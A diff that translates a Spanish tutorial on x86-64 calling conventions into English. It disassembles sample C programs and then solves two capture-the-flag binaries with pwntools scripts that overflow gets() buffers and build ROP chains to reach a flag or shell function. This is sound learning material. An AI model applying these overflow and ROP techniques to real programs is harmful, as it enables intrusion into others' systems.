@@ -1,8 +1,10 @@
 # Calling Conventions
 
-Este repositorio se enfoca en el estudio de las convenciones de llamada en arquitecturas de 64 bit. Estas convenciones definen las reglas para el paso de parámetros a las funciones y la gestión de las pilas de llamadas. Comprender estas convenciones es fundamental para quienes desean adentrarse en la ingeniería inversa y/o explotación de vulnerabilidades en sistemas de bajo nivel. A través de este repositorio se pretende facilitar el aprendizaje de estos conceptos.
+This repository focuses on the study of calling conventions on 64-bit architectures. These conventions define the rules for passing parameters to functions and managing call stacks. Understanding these conventions is fundamental for those who wish to delve into reverse engineering and/or vulnerability exploitation in low-level systems. This repository is intended to facilitate the learning of these concepts.
 
-Comenzaremos compilando y analizando el siguiente codigo.
+We will start by compiling and analyzing the following code.
+
+Translated with DeepL.com (free version)
 
 ```c
 #include <stdio.h>
@@ -20,15 +22,16 @@ int main() {
     vuln(0xdeadc0de, 0x12345678, 0xabcdef10);
 }
 ```
-La función `vuln` contiene una condición que verifica si los tres parámetros de entrada coinciden con los valores esperados: `0xdeadbeef`, `0xdeadc0de` y `0xc0ded00d`. Si la condición se cumple, imprime `Nice!` en la salida estándar; de lo contrario, muestra `Not nice!`. La función `main` invoca vuln dos veces: la primera con los parámetros correctos y la segunda con valores inesperados.
 
-Para compilar este código, utilizaremos las siguientes flags:
+The `vuln` function contains a condition that checks whether the three input parameters match the expected values: `0xdeadbeef`, `0xdeadc0de` and `0xc0ded00d`. If the condition is met, it prints `Nice!` on the standard output; otherwise, it displays `Not nice!`. The `main` function invokes vuln twice: the first time with the correct parameters and the second time with unexpected values.
+
+To compile this code, we will use the following flags:
 
 ```shell
 $ gcc source.c -o vuln-64 -no-pie -fno-stack-protector
 ```
 
-Al ejecutar el binario, obtenemos los resultados esperados:
+When we run the binary, we get the expected results:
 
 ```shell
 $ ./vuln-64
@@ -36,7 +39,7 @@ Nice!
 Not nice!
 ```
 
-Utilizaremos `radare2` para desemsamblar la funcion `main` y observar como se realizan las llamadas a `vuln`.
+We will use `radare2` to disassemble the `main` function and observe how the `vuln` calls are made.
 
 ```asm
             ; DATA XREF from entry0 @ 0x40105d
@@ -56,7 +59,7 @@ Utilizaremos `radare2` para desemsamblar la funcion `main` y observar como se re
 └           0x0040119e      c3             ret
 ```
 
-En el desensamblado anterior vemos que se pasan los valores `0xdeadbeef`, `0xdeadc0de` y `0xc0ded00d` a los registros `edi`, `esi`, `edx` utilizando la instruccion `mov`, esta instruccion se utiliza para cargar los valores que se pasarán como argumentos a la función `vuln`. Los registros utilizados son `rdi`, `rsi` y `rdx`, que son los registros de 64 bits designados para recibir los parámetros en la convención de llamada x86-64, este es el orden.
+In the above disassembly we see that the values `0xdeadbeef`, `0xdeadc0de` and `0xc0ded00d` are passed to the registers `edi`, `esi`, `edx` using the `mov` instruction, this instruction is used to load the values to be passed as arguments to the `vuln` function. The registers used are `rdi`, `rsi` and `rdx`, which are the 64-bit registers designated to receive the parameters in the x86-64 calling convention, this is the order.
 
 ```
 - rdi: First argument
@@ -67,9 +70,9 @@ En el desensamblado anterior vemos que se pasan los valores `0xdeadbeef`, `0xdea
 - r9: Sixth argument
 ```
 
-> Es crucial notar que los valores movidos a estos registros están representados en 32 bits, lo que se indica mediante el uso de los prefijos `e` (`edx`, `esi`, `edi`). Esto refleja cómo se manejan los datos de diferentes tamaños en el contexto de la memoria del programa.
+> It is crucial to note that the values moved to these registers are represented in 32 bits, which is indicated by the use of `e` prefixes (`edx`, `esi`, `edi`). This reflects how data of different sizes is handled in the context of program memory.
 
-Podras decir "Mmmm okay.. se entiende hasta ahora" ¿pero que pasa si pongo mas argumentos? Para eso programe el siguiente codigo.
+You might say “Mmmm okay... it's understood so far” but what if I put more arguments? For that I programmed the following code.
 
 ```c
 //gcc source.c -o vuln-32 -no-pie -fno-stack-protector -m32
@@ -91,7 +94,7 @@ int main() {
 }
 ```
 
-Muy parecido al primero pero con mas argumentos (se compila utilizando las mismas flags). En la primera llamada a `vuln` son los parametros correctos, y en la segunda los incorrectos. Utilizando `radare2` veremos el desensamblado de la funcion `main`. 
+Very similar to the first one but with more arguments (it compiles using the same flags). In the first call to `vuln` are the correct parameters, and in the second the incorrect ones. Using `radare2` we will see the disassembly of the `main` function. 
 
 ```asm
             ; DATA XREF from entry0 @ 0x401068
@@ -124,15 +127,15 @@ Muy parecido al primero pero con mas argumentos (se compila utilizando las misma
 └           0x00401236      c3             ret
 ```
 
-Vemos que cuando ya no tiene mas argumentos utiliza la instruccion `push`. Esta instruccion es fundamental cuando necesitas pasar más argumentos de los que pueden ser manejados por los registros disponibles en la convención de llamada. Como sabemos en x86-64, los primeros seis argumentos se pasan a través de los registros (`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`). Sin embargo, si necesitas pasar más argumentos o si algunos de los valores son más grandes que lo que puede contener un registro de 32 bits, puedes utilizar push para colocarlos en la pila. Espero que con los dos ejemplos anteriores te haya quedado claro a nivel teorico como funcionan las convenciones de llamadas.
+We see that when it has no more arguments it uses the `push` instruction. This instruction is essential when you need to pass more arguments than can be handled by the registers available in the calling convention. As we know in x86-64, the first six arguments are passed through the registers (`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`). However, if you need to pass more arguments or if some of the values are larger than what a 32-bit register can hold, you can use push to place them on the stack. I hope that with the two examples above it is clear to you at a theoretical level how the calling conventions work.
 
-## Practica con desafios
+## Practice with challenges
 
-Para la practica vamos a resolver el desafio `Params` de [ForeverCTF](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/exploiting-calling-conventions) y por ultimo el `exploiting-with-params` de las notas de [ir0nstone](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/exploiting-calling-conventions). Estos desafios tienen que ver sobre las convenciones de llamadas, entonces nos vendran de lujo para practicar lo aprendido recientemente.
+For practice we will solve the `Params` challenge from [ForeverCTF](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/exploiting-calling-conventions) and finally the `exploiting-with-params` from [ir0nstone](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/exploiting-calling-conventions) notes. These challenges have to do with calling conventions, so they will come in handy to practice what we have learned recently.
 
 ### Params
 
-Se nos proporciona un binario llamado `params` con las siguientes protecciones.
+We are provided with a binary called `params` with the following protections.
 
 ```shell
 Arch:     amd64-64-little
@@ -142,7 +145,7 @@ NX:       NX enabled
 PIE:      No PIE (0x400000)
 ```
 
-El binario cuenta con Partial RELRO y NX habilitado, lo que significa que no se pueden ejecutar datos en la pila, aunque la protección contra sobrescritura de la tabla de símbolos es parcial. Las demas protecciones están deshabilitadas. Si ejecutamos el binario nos preguntan por nuestro nombre y podemos indicarle a que direccion de memoria apuntara cada registro.
+The binary has Partial RELRO and NX enabled, which means that no data can be executed on the stack, although the symbol table overwrite protection is partial. All other protections are disabled. If we execute the binary we are asked for our name and we can tell it which memory address each register will point to.
 
 ```shell
 $ ./params
@@ -159,7 +162,7 @@ rsi: 1
 rdi: 1
 ```
 
-Con Ghidra podemos ver la funcion main del binario.
+With Ghidra we can see the main function of the binary.
 
 ```c
 undefined  [16] main(void)
@@ -203,7 +206,7 @@ undefined  [16] main(void)
 }
 ```
 
-Define un buffer de 64 bits y toma nuestro input utilizando `gets`, tenemos un *Buffer Overflow* ya que la funcion `gets` no controla el numero de bytes que ingresamos. Luego define 6 variables con un valor de 0 y nos hace indicarle el valor que tendra cada registro. Si seguimos analizando el Symbol Tree veremos una funcion `get_flag` con el siguiente contenido.
+It defines a 64-bit buffer and takes our input using `gets`, we have a *Buffer Overflow* since the `gets` function does not control the number of bytes we enter. Then it defines 6 variables with a value of 0 and makes us indicate the value that will have each register. If we continue analyzing the Symbol Tree we will see a function `get_flag` with the following content.
 
 ```c
 void get_flag(long param_1,long param_2,long param_3,long param_4)
@@ -222,9 +225,9 @@ void get_flag(long param_1,long param_2,long param_3,long param_4)
 }
 ```
 
-Esta funcion verifica mediante un condicional que los primeros cuatro parametros sean igual a `0x1337`, `0xcafebabe` , `0xdeadbeef` y `4`, si la condicion se cumple nos devuelve una reverse shell. Para resolver este desafio debemos explotar un *Buffer Overflow* para saltar a la funcion `get_flag`, luego de eso debemos indicar los parametros que espera para que nos devuelva la shell, podemos hacer esto indicandole el valor de las direcciones de cuando ejecutamos el binario.
+This function verifies by means of a conditional that the first four parameters are equal to `0x1337`, `0xcafebabe` , `0xdeadbeef` and `4`, if the condition is fulfilled it returns a reverse shell. To solve this challenge we must exploit a *Buffer Overflow* to jump to the `get_flag` function, after that we must indicate the parameters that it waits for the shell to return us, we can do this indicating the value of the addresses of when we executed the binary.
 
-Al recodar las convenciones de llamada, debemos asignar a los registros los siguientes valores: al registro `rdi` le corresponde la dirección `0x1337`, al `rsi` se le asigna la dirección `0xcafebabe`, al `rdx` se le otorga la dirección `0xdeadbeef`, y al `rcx` se le pasa el valor `4`. Con el siguiente exploit resolvemos el desafio.
+When recoding the calling conventions, we must assign to the registers the following values: to the register `rdi` corresponds the address `0x1337`, to `rsi` is assigned the address `0xcafebabe`, to `rdx` is given the address `0xdeadbeef`, and to `rcx` is passed the value `4`. With the following exploit we solve the challenge.
 
 ```python
 from pwn import *
@@ -247,7 +250,7 @@ p.sendline(str(0x1337))
 p.interactive()
 ```
 
-Al ejecutarlo podremos resolver el desafio.
+By executing it we can solve the challenge.
 
 ```shell
 $ python3 solve.py
@@ -265,9 +268,9 @@ $ cat flag.txt
 utflag{u_got_my_params!235407F7}
 ```
 
-### exploiting_with_params Ironstones
+### exploiting_with_params Ir0nstone
 
-Se nos proporciona un binario con las siguientes protecciones.
+We are provided with a binary with the following protections.
 
 ```shell
 Arch:     amd64-64-little
@@ -277,7 +280,7 @@ NX:       NX enabled
 PIE:      No PIE (0x400000)
 ```
 
-Tiene las mismas protecciones que el binario anterior, la unica diferencia es que acá no es necesario hacerle reversing ya que nos entregan su codigo fuente.
+It has the same protections as the previous binary, the only difference is that here it is not necessary to do reversing since they give us their source code.
 
 ```c
 //gcc source.c -o vuln-32 -no-pie -fno-stack-protector -m32
@@ -302,9 +305,9 @@ void flag(int check, int check2) {
 }
 ```
 
-Bemos que en la funcion `main` llama a la funcion `vuln`, en esta funcion se define un buffer de 40 bytes y toma nuestro input utilizando `gets`, acá nuevamente tenemos un *Buffer Overflow* ya que como bien sabemos, `gets` no valida el largo del input ingresado por nosotros, entonces podremos desbordar el buffer. Mas abajo define una funcion `flag` que espera los parametros `0xdeadc0de` y `0xc0ded00d` para devolvernos un `Got it!`, indicandonos que resolvimos el desafio.
+We see that in the function `main` calls the function `vuln`, in this function is defined a buffer of 40 bytes and takes our input using `gets`, here again we have a *Buffer Overflow* because as we know, `gets` does not validate the length of the input entered by us, then we can overflow the buffer. Further down it defines a function `flag` that waits for the parameters `0xdeadc0de` and `0xc0ded00d` to return us a `Got it!`, indicating us that we solved the challenge.
 
-Para resolver este desafio debemos explotar el *Buffer Overflow*, saltar a la funcion flag, utilizar un gadget `pop rdi; ret` para asignarle el valor `0xdeadc0de` y un gadget `pop rsi; ret` para asignarle el valor `0xc0ded00d` y resolver el desafio, para encontrar los gadgets utilizaremos `ROPgadget`.
+To solve this challenge we must exploit the *Buffer Overflow*, jump to the flag function, use a `pop rdi; ret` gadget to assign the value `0xdeadc0de` and a `pop rsi; ret` gadget to assign the value `0xc0ded00d` and solve the challenge, to find the gadgets we will use `ROPgadget`.
 
 ```shell
 $ ROPgadget --binary vuln-64 | grep "rdi"
@@ -316,7 +319,7 @@ $ ROPgadget --binary vuln-64 | grep "rsi"
 0x00000000004011f9 : pop rsi ; pop r15 ; ret
 ```
 
-Una vez con esto tenemos lo necesario para escribir nuestro script de solucion, con el siguiente podremos resolver el desafio.
+Once we have this we have what we need to write our solution script, with the following we can solve the challenge.
 
 ```python3
 from pwn import *
@@ -338,7 +341,7 @@ p.sendline(payload)
 p.interactive()
 ```
 
-Vemos que defino los dos gadgets, luego exploto el Buffer Overflow (el offset era de 56 bytes), le paso el gadget de `POP_RDI` para asignarle el valor `0xdeadc0de` al registro, luego le paso el gadget `POP_RSI` para asignarle el valor `0xc0ded00d` al registro, por ultimo paso un `0x90` (NOP) para el valor `pop r15` del gadget `POP_RSI` y por ultimo llamo a la funcion `flag()`, al ejecutar el script resolvemos el desafio.
+We see that I define the two gadgets, then I exploit the Buffer Overflow (the offset was 56 bytes), I pass the `POP_RDI` gadget to assign the `0xdeadc0de` value to the register `rdi`, then I pass the `POP_RSI` gadget to assign the `0xc0ded00d` value to the register `rsi`, finally I pass a `0x90` (NOP) for the `pop r15` value of the `POP_RSI` gadget and finally I call the `flag()` function, by executing the script we solve the challenge.
 
 ```shell
 $ python3 solve.py
